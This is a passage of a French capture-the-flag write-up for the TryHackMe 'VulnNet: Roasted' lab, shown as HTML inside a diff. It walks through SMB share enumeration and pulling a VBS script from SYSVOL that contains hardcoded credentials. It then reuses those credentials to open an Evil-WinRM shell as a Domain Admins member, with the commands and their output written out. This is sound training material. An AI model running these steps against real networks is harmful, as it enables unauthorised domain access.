+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:14:43 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># smbmap -H &amp;#34;10.10.211.33&amp;#34; -u &amp;#39;enterprise-core-vn&amp;#39; -p &amp;#39;ry=ibfkfv,s6h,&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ________ ___ ___ _______ ___ ___ __ _______
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> /&lt;span class="s2">&amp;#34; )|&amp;#34;&lt;/span> &lt;span class="se">\ &lt;/span> /&lt;span class="s2">&amp;#34; || _ &amp;#34;&lt;/span>&lt;span class="se">\ &lt;/span>&lt;span class="p">|&lt;/span>&lt;span class="s2">&amp;#34; \ /&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> /&lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="se">\ &lt;/span> &lt;span class="p">|&lt;/span> __ &lt;span class="s2">&amp;#34;\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> (: \___/ \ \ // |(. |_) :) \ \ // | / \ (. |__) :)
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> \___ \ /\ \/. ||: \/ /\ \/. | /&amp;#39; /\ \ |: ____/
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> __/ \ |: \. |(| _ \ |: \. | // __&amp;#39; \ (| /
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s2"> /&amp;#34;&lt;/span> &lt;span class="se">\ &lt;/span> :&lt;span class="o">)&lt;/span> &lt;span class="p">|&lt;/span>. &lt;span class="se">\ &lt;/span> /: &lt;span class="o">||&lt;/span>: &lt;span class="p">|&lt;/span>_&lt;span class="o">)&lt;/span> :&lt;span class="o">)&lt;/span>&lt;span class="p">|&lt;/span>. &lt;span class="se">\ &lt;/span> /: &lt;span class="p">|&lt;/span> / / &lt;span class="se">\ &lt;/span> &lt;span class="se">\ &lt;/span> /&lt;span class="p">|&lt;/span>__/ &lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span> &lt;span class="o">(&lt;/span>_______/ &lt;span class="p">|&lt;/span>___&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>_/&lt;span class="p">|&lt;/span>___&lt;span class="p">|&lt;/span>&lt;span class="o">(&lt;/span>_______/ &lt;span class="p">|&lt;/span>___&lt;span class="p">|&lt;/span>&lt;span class="se">\_&lt;/span>_/&lt;span class="p">|&lt;/span>___&lt;span class="p">|&lt;/span>&lt;span class="o">(&lt;/span>___/ &lt;span class="se">\_&lt;/span>__&lt;span class="o">)(&lt;/span>_______&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> -----------------------------------------------------------------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SMBMap - Samba Share Enumerator v1.10.2 &lt;span class="p">|&lt;/span> Shawn Evans - ShawnDEvans@gmail.com
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> https://github.com/ShawnDEvans/smbmap
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Detected &lt;span class="m">1&lt;/span> hosts serving SMB
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>*&lt;span class="o">]&lt;/span> Established &lt;span class="m">1&lt;/span> SMB connections&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span> and &lt;span class="m">1&lt;/span> authentidated session&lt;span class="o">(&lt;/span>s&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>+&lt;span class="o">]&lt;/span> IP: 10.10.211.33:445 Name: vulnnet-rst.local Status: Authenticated
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Disk Permissions Comment
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ---- ----------- -------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ADMIN$ NO ACCESS Remote Admin
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> C$ NO ACCESS Default share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> IPC$ READ ONLY Remote IPC
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> NETLOGON READ ONLY Logon server share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> SYSVOL READ ONLY Logon server share
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VulnNet-Business-Anonymous READ ONLY VulnNet Business Sharing
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> VulnNet-Enterprise-Anonymous READ ONLY VulnNet Enterprise Sharing
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>On a deux partages SMB:&lt;/p>
+&lt;ul>
+&lt;li>&lt;strong>VulnNet-Business-Anonymous&lt;/strong>&lt;/li>
+&lt;li>&lt;strong>VulnNet-Enterprise-Anonymous&lt;/strong>&lt;/li>
+&lt;/ul>
+&lt;p>Les autre partages sont des partages par défaut de Windows.&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:18:05 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># smbclient \\\\10.10.211.33\\SYSVOL -U &amp;#39;enterprise-core-vn%ry=ibfkfv,s6h,&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Try &lt;span class="s2">&amp;#34;help&amp;#34;&lt;/span> to get a list of possible commands.
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:19:49 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:19:49 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> vulnnet-rst.local Dr &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:19:49 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8771839&lt;/span> blocks of size 4096. &lt;span class="m">4553871&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\&amp;gt;&lt;/span> &lt;span class="nb">cd&lt;/span> vulnnet-rst.local&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>smb: &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:23:40 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:23:40 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> DfsrPrivate DHSr &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:23:40 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> Policies D &lt;span class="m">0&lt;/span> Thu Mar &lt;span class="m">11&lt;/span> 19:20:26 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> scripts D &lt;span class="m">0&lt;/span> Tue Mar &lt;span class="m">16&lt;/span> 23:15:49 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8771839&lt;/span> blocks of size 4096. &lt;span class="m">4553871&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\&amp;gt;&lt;/span> &lt;span class="nb">cd&lt;/span> scripts&lt;span class="se">\
+&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="se">&lt;/span>smb: &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\s&lt;/span>cripts&lt;span class="se">\&amp;gt;&lt;/span> ls
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> . D &lt;span class="m">0&lt;/span> Tue Mar &lt;span class="m">16&lt;/span> 23:15:49 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> .. D &lt;span class="m">0&lt;/span> Tue Mar &lt;span class="m">16&lt;/span> 23:15:49 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> ResetPassword.vbs A &lt;span class="m">2821&lt;/span> Tue Mar &lt;span class="m">16&lt;/span> 23:18:14 &lt;span class="m">2021&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="m">8771839&lt;/span> blocks of size 4096. &lt;span class="m">4553871&lt;/span> blocks available
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\s&lt;/span>cripts&lt;span class="se">\&amp;gt;&lt;/span> wget ResetPassword.vbs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">wget: &lt;span class="nb">command&lt;/span> not found
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\s&lt;/span>cripts&lt;span class="se">\&amp;gt;&lt;/span> get ResetPassword.vbs
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">getting file &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\s&lt;/span>cripts&lt;span class="se">\R&lt;/span>esetPassword.vbs of size &lt;span class="m">2821&lt;/span> as ResetPassword.vbs &lt;span class="o">(&lt;/span>0.3 KiloBytes/sec&lt;span class="o">)&lt;/span> &lt;span class="o">(&lt;/span>average 0.3 KiloBytes/sec&lt;span class="o">)&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">smb: &lt;span class="se">\v&lt;/span>ulnnet-rst.local&lt;span class="se">\s&lt;/span>cripts&lt;span class="se">\&amp;gt;&lt;/span> &lt;span class="nb">exit&lt;/span>
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;p>On a récupéré le script &lt;strong>ResetPassword.vbs&lt;/strong>.&lt;/p>
+&lt;pre>&lt;code>```bash
+[May 12, 2024 - 12:20:21 (UTC)] exegol-thm VulnNet: Roasted # cat ResetPassword.vbs
+&lt;/code>&lt;/pre>
+&lt;p>Option Explicit&lt;/p>
+&lt;p>Dim objRootDSE, strDNSDomain, objTrans, strNetBIOSDomain
+Dim strUserDN, objUser, strPassword, strUserNTName&lt;/p>
+&lt;p>&amp;rsquo; Constants for the NameTranslate object.
+Const ADS_NAME_INITTYPE_GC = 3
+Const ADS_NAME_TYPE_NT4 = 3
+Const ADS_NAME_TYPE_1779 = 1&lt;/p>
+&lt;p>If (Wscript.Arguments.Count &amp;lt;&amp;gt; 0) Then
+Wscript.Echo &amp;ldquo;Syntax Error. Correct syntax is:&amp;rdquo;
+Wscript.Echo &amp;ldquo;cscript ResetPassword.vbs&amp;rdquo;
+Wscript.Quit
+End If&lt;/p>
+&lt;p>strUserNTName = &amp;ldquo;a-whitehat&amp;rdquo;
+strPassword = &amp;ldquo;bNdKVkjv3RR9ht&amp;rdquo;&lt;/p>
+&lt;p>&amp;rsquo; Determine DNS domain name from RootDSE object.
+Set objRootDSE = GetObject(&amp;ldquo;LDAP://RootDSE&amp;rdquo;)
+strDNSDomain = objRootDSE.Get(&amp;ldquo;defaultNamingContext&amp;rdquo;)&lt;/p>
+&lt;p>&amp;rsquo; Use the NameTranslate object to find the NetBIOS domain name from the
+&amp;rsquo; DNS domain name.
+Set objTrans = CreateObject(&amp;ldquo;NameTranslate&amp;rdquo;)
+objTrans.Init ADS_NAME_INITTYPE_GC, &amp;quot;&amp;quot;
+objTrans.Set ADS_NAME_TYPE_1779, strDNSDomain
+strNetBIOSDomain = objTrans.Get(ADS_NAME_TYPE_NT4)
+&amp;rsquo; Remove trailing backslash.
+strNetBIOSDomain = Left(strNetBIOSDomain, Len(strNetBIOSDomain) - 1)&lt;/p>
+&lt;p>&amp;rsquo; Use the NameTranslate object to convert the NT user name to the
+&amp;rsquo; Distinguished Name required for the LDAP provider.
+On Error Resume Next
+objTrans.Set ADS_NAME_TYPE_NT4, strNetBIOSDomain &amp;amp; &amp;ldquo;&amp;quot; &amp;amp; strUserNTName
+If (Err.Number &amp;lt;&amp;gt; 0) Then
+On Error GoTo 0
+Wscript.Echo &amp;ldquo;User &amp;quot; &amp;amp; strUserNTName _
+&amp;amp; &amp;quot; not found in Active Directory&amp;rdquo;
+Wscript.Echo &amp;ldquo;Program aborted&amp;rdquo;
+Wscript.Quit
+End If
+strUserDN = objTrans.Get(ADS_NAME_TYPE_1779)
+&amp;rsquo; Escape any forward slash characters, &amp;ldquo;/&amp;rdquo;, with the backslash
+&amp;rsquo; escape character. All other characters that should be escaped are.
+strUserDN = Replace(strUserDN, &amp;ldquo;/&amp;rdquo;, &amp;ldquo;/&amp;rdquo;)&lt;/p>
+&lt;p>&amp;rsquo; Bind to the user object in Active Directory with the LDAP provider.
+On Error Resume Next
+Set objUser = GetObject(&amp;ldquo;LDAP://&amp;rdquo; &amp;amp; strUserDN)
+If (Err.Number &amp;lt;&amp;gt; 0) Then
+On Error GoTo 0
+Wscript.Echo &amp;ldquo;User &amp;quot; &amp;amp; strUserNTName _
+&amp;amp; &amp;quot; not found in Active Directory&amp;rdquo;
+Wscript.Echo &amp;ldquo;Program aborted&amp;rdquo;
+Wscript.Quit
+End If
+objUser.SetPassword strPassword
+If (Err.Number &amp;lt;&amp;gt; 0) Then
+On Error GoTo 0
+Wscript.Echo &amp;ldquo;Password NOT reset for &amp;quot; &amp;amp;vbCrLf &amp;amp; strUserNTName
+Wscript.Echo &amp;ldquo;Password &amp;quot; &amp;amp; strPassword &amp;amp; &amp;quot; may not be allowed, or&amp;rdquo;
+Wscript.Echo &amp;ldquo;this client may not support a SSL connection.&amp;rdquo;
+Wscript.Echo &amp;ldquo;Program aborted&amp;rdquo;
+Wscript.Quit
+Else
+objUser.AccountDisabled = False
+objUser.Put &amp;ldquo;pwdLastSet&amp;rdquo;, 0
+Err.Clear
+objUser.SetInfo
+If (Err.Number &amp;lt;&amp;gt; 0) Then
+On Error GoTo 0
+Wscript.Echo &amp;ldquo;Password reset for &amp;quot; &amp;amp; strUserNTName
+Wscript.Echo &amp;ldquo;But, unable to enable account or expire password&amp;rdquo;
+Wscript.Quit
+End If
+End If
+On Error GoTo 0&lt;/p>
+&lt;p>Wscript.Echo &amp;ldquo;Password reset, account enabled,&amp;rdquo;
+Wscript.Echo &amp;ldquo;and password expired for user &amp;quot; &amp;amp; strUserNTName#&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt">1
+&lt;/span>&lt;span class="lnt">2
+&lt;/span>&lt;span class="lnt">3
+&lt;/span>&lt;span class="lnt">4
+&lt;/span>&lt;span class="lnt">5
+&lt;/span>&lt;span class="lnt">6
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-fallback" data-lang="fallback">&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">HOP ! On a des credentials:
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">```bash
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strUserNTName = &amp;#34;a-whitehat&amp;#34;
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">strPassword = &amp;#34;bNdKVkjv3RR9ht&amp;#34;
+&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
+&lt;/div>
+&lt;/div>&lt;h4 id="privesc">
+&lt;a href="#privesc">#&lt;/a>
+privesc
+&lt;/h4>&lt;p>On peut maintenant se connecter à la machine avec Evil-WinRM:&lt;/p>
+&lt;div class="highlight">&lt;div class="chroma">
+&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
+&lt;/span>&lt;span class="lnt"> 2
+&lt;/span>&lt;span class="lnt"> 3
+&lt;/span>&lt;span class="lnt"> 4
+&lt;/span>&lt;span class="lnt"> 5
+&lt;/span>&lt;span class="lnt"> 6
+&lt;/span>&lt;span class="lnt"> 7
+&lt;/span>&lt;span class="lnt"> 8
+&lt;/span>&lt;span class="lnt"> 9
+&lt;/span>&lt;span class="lnt">10
+&lt;/span>&lt;span class="lnt">11
+&lt;/span>&lt;span class="lnt">12
+&lt;/span>&lt;span class="lnt">13
+&lt;/span>&lt;span class="lnt">14
+&lt;/span>&lt;span class="lnt">15
+&lt;/span>&lt;span class="lnt">16
+&lt;/span>&lt;span class="lnt">17
+&lt;/span>&lt;span class="lnt">18
+&lt;/span>&lt;span class="lnt">19
+&lt;/span>&lt;span class="lnt">20
+&lt;/span>&lt;span class="lnt">21
+&lt;/span>&lt;span class="lnt">22
+&lt;/span>&lt;span class="lnt">23
+&lt;/span>&lt;span class="lnt">24
+&lt;/span>&lt;span class="lnt">25
+&lt;/span>&lt;span class="lnt">26
+&lt;/span>&lt;span class="lnt">27
+&lt;/span>&lt;span class="lnt">28
+&lt;/span>&lt;span class="lnt">29
+&lt;/span>&lt;span class="lnt">30
+&lt;/span>&lt;span class="lnt">31
+&lt;/span>&lt;span class="lnt">32
+&lt;/span>&lt;span class="lnt">33
+&lt;/span>&lt;span class="lnt">34
+&lt;/span>&lt;span class="lnt">35
+&lt;/span>&lt;span class="lnt">36
+&lt;/span>&lt;span class="lnt">37
+&lt;/span>&lt;span class="lnt">38
+&lt;/span>&lt;span class="lnt">39
+&lt;/span>&lt;span class="lnt">40
+&lt;/span>&lt;span class="lnt">41
+&lt;/span>&lt;span class="lnt">42
+&lt;/span>&lt;span class="lnt">43
+&lt;/span>&lt;span class="lnt">44
+&lt;/span>&lt;span class="lnt">45
+&lt;/span>&lt;span class="lnt">46
+&lt;/span>&lt;span class="lnt">47
+&lt;/span>&lt;span class="lnt">48
+&lt;/span>&lt;span class="lnt">49
+&lt;/span>&lt;span class="lnt">50
+&lt;/span>&lt;span class="lnt">51
+&lt;/span>&lt;span class="lnt">52
+&lt;/span>&lt;span class="lnt">53
+&lt;/span>&lt;span class="lnt">54
+&lt;/span>&lt;span class="lnt">55
+&lt;/span>&lt;span class="lnt">56
+&lt;/span>&lt;span class="lnt">57
+&lt;/span>&lt;span class="lnt">58
+&lt;/span>&lt;span class="lnt">59
+&lt;/span>&lt;span class="lnt">60
+&lt;/span>&lt;span class="lnt">61
+&lt;/span>&lt;span class="lnt">62
+&lt;/span>&lt;span class="lnt">63
+&lt;/span>&lt;span class="lnt">64
+&lt;/span>&lt;span class="lnt">65
+&lt;/span>&lt;span class="lnt">66
+&lt;/span>&lt;span class="lnt">67
+&lt;/span>&lt;span class="lnt">68
+&lt;/span>&lt;span class="lnt">69
+&lt;/span>&lt;span class="lnt">70
+&lt;/span>&lt;span class="lnt">71
+&lt;/span>&lt;span class="lnt">72
+&lt;/span>&lt;span class="lnt">73
+&lt;/span>&lt;span class="lnt">74
+&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
+&lt;td class="lntd">
+&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">&lt;span class="o">[&lt;/span>May 12, &lt;span class="m">2024&lt;/span> - 12:24:24 &lt;span class="o">(&lt;/span>UTC&lt;span class="o">)]&lt;/span> exegol-thm VulnNet: Roasted &lt;span class="c1"># evil-winrm -i 10.10.211.33 -u &amp;#39;a-whitehat&amp;#39; -p &amp;#39;bNdKVkjv3RR9ht&amp;#39;&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Evil-WinRM shell v3.5
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Info: Establishing connection to remote endpoint
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\a&lt;/span>-whitehat&lt;span class="se">\D&lt;/span>ocuments&amp;gt; dir
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">*Evil-WinRM* PS C:&lt;span class="se">\U&lt;/span>sers&lt;span class="se">\a&lt;/span>-whitehat&lt;span class="se">\D&lt;/span>ocuments&amp;gt; whoami /all
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">USER INFORMATION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">----------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">User Name &lt;span class="nv">SID&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">======================&lt;/span> &lt;span class="o">=============================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">vulnnet-rst&lt;span class="se">\a&lt;/span>-whitehat S-1-5-21-1589833671-435344116-4136949213-1105
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">GROUP INFORMATION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">-----------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Group Name Type SID &lt;span class="nv">Attributes&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">==================================================&lt;/span> &lt;span class="o">================&lt;/span> &lt;span class="o">============================================&lt;/span> &lt;span class="o">===============================================================&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BUILTIN&lt;span class="se">\U&lt;/span>sers Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BUILTIN&lt;span class="se">\P&lt;/span>re-Windows &lt;span class="m">2000&lt;/span> Compatible Access Alias S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">BUILTIN&lt;span class="se">\A&lt;/span>dministrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group owner
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NT AUTHORITY&lt;span class="se">\N&lt;/span>ETWORK Well-known group S-1-5-2 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NT AUTHORITY&lt;span class="se">\A&lt;/span>uthenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NT AUTHORITY&lt;span class="se">\T&lt;/span>his Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\D&lt;/span>omain Admins Group S-1-5-21-1589833671-435344116-4136949213-512 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">VULNNET-RST&lt;span class="se">\D&lt;/span>enied RODC Password Replication Group Alias S-1-5-21-1589833671-435344116-4136949213-572 Mandatory group, Enabled by default, Enabled group, Local Group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">NT AUTHORITY&lt;span class="se">\N&lt;/span>TLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Mandatory Label&lt;span class="se">\H&lt;/span>igh Mandatory Level Label S-1-16-12288
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">PRIVILEGES INFORMATION
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">----------------------
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">Privilege Name Description &lt;span class="nv">State&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">=========================================&lt;/span> &lt;span class="o">==================================================================&lt;/span> &lt;span class="o">=======&lt;/span>
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeIncreaseQuotaPrivilege Adjust memory quotas &lt;span class="k">for&lt;/span> a process Enabled
+&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">SeMachineAccountPrivilege Add workstations to domain Enabled
